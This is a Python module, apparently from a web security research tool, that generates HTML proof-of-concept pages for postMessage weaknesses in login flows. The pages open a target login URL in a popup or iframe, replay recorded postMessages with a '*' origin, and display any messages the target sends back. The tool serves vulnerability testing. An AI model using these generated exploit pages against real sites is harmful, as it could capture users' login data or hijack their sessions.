import json

class PoCGenerator:

    def __init__(self, ctx):
        self.ctx = ctx

    def generate_poc(self):
        """ Generate PoC exploits as HTML code.
            Returns:
                - (True, String), if exploit generation was successfull
                - (False, String), if exploit generation was not successfull
        """

        flow = self.get_stm("flow")
        if not flow:
            return (False, "Could not determine flow type (redirect, popup, iframe)")

        loginreqframe = self.get_stm("loginreqframe")
        if not loginreqframe:
            return (False, "Could not determine the frame containing the login request")

        loginrequrl = self.get_stm("loginrequrl")
        if not loginrequrl:
            return (False, "Could not determine the login request")

        # Initiator
        loginreqframe_first_url = self.get_first_url_of_frame(loginreqframe)
        if not loginreqframe_first_url:
            return (False, "Could not determine the first URL of the frame containing the login request")
        loginreqframe_postmessages = self.get_postmessages_data_sent_to_frame(loginreqframe)

        # Receiver
        receivers = [] # list of tuples with (listener, url, [postmessages])
        message_listeners = []
        for report in self.ctx.reports:
            if report["key"] == "addeventlistener" and report["val"]["type"] == "message":
                message_listeners.append(report)
        for listener in message_listeners:
            url = listener["val"]["href"]
            postmessages = self.get_postmessages_data_sent_to_frame(listener["val"]["hierarchy"])
            receivers.append((listener, url, postmessages))

        poc_html = self.poc_template(loginreqframe_first_url, loginreqframe_postmessages, receivers)
        return (True, poc_html)

    def get_stm(self, stm):
        """ Get the *first* statement of a given key.
            Returns:
                - String, if the statement could be determined
                - None, if the statement could not be determined
        """
        if stm in self.ctx.statements:
            if type(self.ctx.statements[stm]) is list:
                return self.ctx.statements[stm][0]
            else:
                return self.ctx.statements[stm]

    def get_first_url_of_frame(self, frame):
        """ Get the URL first loaded into a frame.
            Returns:
                - String, if the first URL of the frame could be determined
                - None, if the first URL of the frame could not be determined
        """
        for report in self.ctx.reports:
            if report["key"] == "documentinit":
                hierarchy = report["val"]["hierarchy"]
                if frame == hierarchy:
                    return report["val"]["href"]
        return None

    def get_postmessages_data_sent_to_frame(self, frame):
        """ Get the postmessages data sent to a frame.
            Returns:
                - List of postmessages with their corresponding data
        """
        postmessages = []
        for report in self.ctx.reports:
            if report["key"] == "postmessagereceived" and report["val"]["target_frame"] == frame:
                postmessage_data = report["val"]["data"]
                postmessage_data_type = report["val"]["data_type"]
                if postmessage_data_type == "string":
                    postmessage_data_escaped = self.encode_pm_data(postmessage_data)
                    postmessages.append(f'"{postmessage_data_escaped}"')
                else:
                    postmessage_data_escaped = self.encode_pm_data(postmessage_data)
                    postmessages.append(f"{postmessage_data_escaped}")
        return postmessages

    @staticmethod
    def encode_pm_data(data):
        if type(data) is str:
            return data \
                .replace('\\', '\\\\') \
                .replace('"', '\\"') \
                .replace('<', '\\x3c') \
                .replace('>', '\\x3e')
        elif type(data) is dict or type(data) is list:
            return json.dumps(data) \
                .replace('<', '\\x3c') \
                .replace('>', '\\x3e')
        else:
            return data

    def poc_template(self, initiator_url, postmessages, receivers):
        title = self.get_stm("initurl") or "N/A"
        statements_string = json.dumps(self.ctx.statements, indent=4)

        # Initiator Exploits

        # Popup
        postmessages_popup_string = ""
        for postmessage in postmessages:
            postmessages_popup_string += f"popup.postMessage({postmessage}, '*');\n"
        # IFrame
        postmessages_iframe_string = ""
        for postmessage in postmessages:
            postmessages_iframe_string += f"frame.contentWindow.postMessage({postmessage}, '*');\n"

        # Receiver Exploits

        receiver_index = 0
        receiver_js_exploit = ""
        for receiver in receivers:
            url = receiver[1]
            postmessages = receiver[2]

            receiver_js_exploit += f"    let button_popup_receiver_{receiver_index} = document.createElement('button');\n"
            receiver_js_exploit += f"    button_popup_receiver_{receiver_index}.innerText = 'Open Receiver {receiver_index} in Popup';\n"
            receiver_js_exploit += f"    button_popup_receiver_{receiver_index}.onclick = () => {{\n"
            receiver_js_exploit += f"      popup_receiver_{receiver_index} = window.open('{url}', '_blank');\n"
            receiver_js_exploit += "      setTimeout(() => {\n"
            for postmessage in postmessages:
                receiver_js_exploit += f"        popup_receiver_{receiver_index}.postMessage({postmessage}, '*');\n"
            receiver_js_exploit += "      }, 3000);\n"
            receiver_js_exploit += "    };\n"
            receiver_js_exploit += f"    let p_popup_receiver_{receiver_index} = document.createElement('p');\n"
            receiver_js_exploit += f"    p_popup_receiver_{receiver_index}.appendChild(button_popup_receiver_{receiver_index});\n"
            receiver_js_exploit += f"    document.getElementById('receiverExploits').appendChild(p_popup_receiver_{receiver_index});\n"

            receiver_js_exploit += f"    let button_iframe_receiver_{receiver_index} = document.createElement('button');\n"
            receiver_js_exploit += f"    button_iframe_receiver_{receiver_index}.innerText = 'Embed Receiver {receiver_index} in IFrame';\n"
            receiver_js_exploit += f"    button_iframe_receiver_{receiver_index}.onclick = () => {{\n"
            receiver_js_exploit += f"      iframe_receiver_{receiver_index} = document.createElement('iframe');\n"
            receiver_js_exploit += f"      iframe_receiver_{receiver_index}.src = '{url}';\n"
            receiver_js_exploit += f"      iframe_receiver_{receiver_index}.onload = () => {{\n"
            for postmessage in postmessages:
                receiver_js_exploit += f"        iframe_receiver_{receiver_index}.contentWindow.postMessage({postmessage}, '*');\n"
            receiver_js_exploit += "      };\n"
            receiver_js_exploit += f"      document.body.appendChild(iframe_receiver_{receiver_index});\n"
            receiver_js_exploit += "    };\n"
            receiver_js_exploit += f"    let p_iframe_receiver_{receiver_index} = document.createElement('p');\n"
            receiver_js_exploit += f"    p_iframe_receiver_{receiver_index}.appendChild(button_iframe_receiver_{receiver_index});\n"
            receiver_js_exploit += f"    document.getElementById('receiverExploits').appendChild(p_iframe_receiver_{receiver_index});\n"

            receiver_index += 1

        poc_template = f"""\
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PoC: {title}</title>
</head>
<body>
  <h1>PoC: {title}</h1>

  <h3>Statements</h3>
  <code><pre>{statements_string}</pre></code>

  <h3>Received postMessages:</h3>
  <div id="pms"></div>

  <h3>Initiator Exploits</h3>
  <p><button onclick="openPopupInitiator()">Open Initiator in Popup</button></p>
  <p><button onclick="embedIframeInitiator()">Embed Initiator in IFrame</button></p>

  <h3>Receiver Exploits</h3>
  <div id="receiverExploits"></div>

  <script>
    window.onmessage = (e) => {{
      let p = document.createElement('p')
      p.textContent = `Received postMessage from ${{e.origin}} with data of type ${{typeof e.data}}: ${{JSON.stringify(e.data)}}`
      document.querySelector('#pms').appendChild(p)
    }}

    /* Initiator Exploits */

    function openPopupInitiator() {{
      popup = window.open('{initiator_url}', '_blank')
      setTimeout(() => {{
{postmessages_popup_string}
      }}, 3000) // wait for popup to load
    }}

    function embedIframeInitiator() {{
      frame = document.createElement('iframe')
      frame.src = '{initiator_url}'
      frame.onload = () => {{
{postmessages_iframe_string}
      }}
      document.body.appendChild(frame)
    }}

    /* Receiver Exploits */

{receiver_js_exploit}
  </script>
</body>
</html>
        """
        return poc_template
